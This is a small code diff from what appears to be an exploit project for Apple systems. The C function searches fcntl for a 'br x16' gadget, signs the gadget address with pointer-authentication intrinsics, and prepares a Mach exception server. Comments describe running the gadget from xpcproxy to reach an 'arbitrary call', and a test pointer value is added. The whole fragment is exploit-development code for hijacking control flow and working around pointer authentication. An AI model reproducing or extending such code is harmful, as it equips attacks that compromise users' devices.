@@ -152,15 +152,19 @@ mach_port_t setup_exception_server(void) {
     
     // find br x16
     uint32_t *func = ((uint32_t *)ptrauth_strip((void *)fcntl, ptrauth_key_function_pointer));
-    for (; *func != 0xd61f0200; func++) {}
-    brX16Address = (void *)ptrauth_sign_unauthenticated((void *)func, ptrauth_key_function_pointer, 0);
+    for (; *func != 0xd61f0200;/* br x16 opcode */ func++) {}
+    brX16Address = (void *)ptrauth_sign_unauthenticated((void *)(func), ptrauth_key_function_pointer, 0);
     
     printf("INFO of br x16 address:\n");
     printf("Unsigned: 0x%16llx\n", (uint64_t)func);
     printf("Signed:   0x%16llx\n", (uint64_t)brX16Address);
+
+    // brX16Address will be first executed from xpcproxy
+    // and then x16 will be pointed to arbitrary call, but x16 has some PAC issues maybe?
     brX16Address = (void *)func;
     printf("Signed2:  0x%16llx\n", (uint64_t)brX16Address);
     // brX16Address = (void *)0xb62cd70206b89848;
+    // brX16Address = (void *)0x4142434445464748;
     
     mach_port_t server_port;
     kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &server_port);
